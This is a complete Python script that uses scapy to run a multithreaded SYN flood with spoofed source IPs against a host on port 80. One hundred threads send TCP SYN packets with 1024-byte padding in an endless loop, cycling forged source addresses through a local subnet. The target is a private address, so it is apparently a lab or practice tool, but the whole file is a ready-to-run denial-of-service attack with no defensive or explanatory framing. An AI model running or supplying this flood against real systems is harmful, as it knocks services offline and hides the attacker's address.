from scapy.all import *
from faker import Faker
import threading

conf.verb = 0

host = "192.168.0.7"
port = 80

origenIP = "192.168.0."
endIP = 10

packet_number = 0

def send_packets():
    global packet_number, endIP
    while True:    
        packet_number += 1 
        packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
        send(packet, inter= 0.0002, verbose=False)  
        print("Packet %d sent" %packet_number)
        endIP += 1 
        if(endIP == 200):
            endIP = 10

# create multiple threads to send packets
num_threads = 100
threads = []
for i in range(num_threads):
    t = threading.Thread(target=send_packets)
    t.start()
    threads.append(t)

# wait for all threads to finish
for t in threads:
    t.join()